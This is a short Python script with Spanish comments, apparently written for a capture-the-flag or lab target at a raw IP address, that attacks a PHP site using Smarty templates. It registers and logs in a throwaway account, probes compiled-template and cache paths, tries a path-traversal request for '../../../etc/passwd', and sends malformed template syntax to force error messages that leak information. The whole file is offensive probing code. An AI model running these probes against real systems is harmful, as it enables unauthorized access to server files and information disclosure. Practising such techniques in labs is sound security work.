#!/usr/bin/env python3
"""
Smarty compila templates a PHP y los cachea en templates_c/

¿Puedo contaminar el cache o forzar la compilación de un template malicioso?
"""
import requests
import random
import string
import re

TARGET = "http://94.237.49.23:45329"

def random_string(length=8):
    return ''.join(random.choices(string.ascii_lowercase + string.digits, k=length))

session = requests.Session()
username = random_string()
password = random_string()

data = {'name': 'user1', 'username': username, 'password': password}
session.post(f"{TARGET}/register.php", data=data)
session.post(f"{TARGET}/login.php", data={'username': username, 'password': password})

print(f"[*] Usuario: {username}:{password}\n")

# Probar acceder a templates compilados
print("[*] Intentando acceder a templates compilados...")
template_paths = [
    '/templates_c/index.tpl.php',
    '/templates_c/login.tpl.php',
    '/templates_c/^index.tpl.php',
    '/templates_c/%5Eindex.tpl.php',
    '/cache/index.tpl',
]

for path in template_paths:
    resp = session.get(f"{TARGET}{path}")
    if resp.status_code != 404 and resp.status_code != 403:
        print(f"    [{resp.status_code}] {path} - {len(resp.text)} bytes")

# Probar si puedo incluir templates directamente
print("\n[*] Probando template injection via parámetros...")
test_params = [
    ('?template=../../../etc/passwd', 'LFI'),
    ('?template=index', 'Template include'),
    ('?tpl=index', 'Alternate param'),
]

for param, desc in test_params:
    resp = session.get(f"{TARGET}/{param}")
    print(f"    {desc}: {resp.status_code}")

# ¿Puedo forzar un error de Smarty que revele información?
print("\n[*] Intentando forzar errores de Smarty...")
resp = session.get(f"{TARGET}/?name={'{'}malformed")
if "Smarty" in resp.text:
    print(f"    [!] Error de Smarty detectado")
    print(resp.text[:500])
